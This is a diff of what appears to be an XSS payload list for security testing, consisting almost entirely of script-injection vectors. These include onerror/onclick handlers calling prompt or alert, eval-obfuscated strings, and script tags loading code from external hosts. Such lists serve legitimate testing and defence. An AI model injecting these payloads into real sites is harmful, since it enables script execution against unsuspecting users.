@@ -8,8 +8,6 @@ info:
 ';a=prompt,a()//
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
-"onclick=prompt(8)>"@x.y
-"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
 <image/src/onerror=prompt(8)>
 <img/src/onerror=prompt(8)>
 <image src/onerror=prompt(8)>
@@ -44,7 +42,6 @@ info:
 <x onmouseup=alert(1)>click this! 
 <x contenteditable onpaste=alert(1)>paste here!
 <script>alert(1)// 
-<script>alert(1)<!–
 <script src=//brutelogic.com.br/1.js> 
 <script src=//3334957647/1>
 %3Cx onxxx=alert(1) 
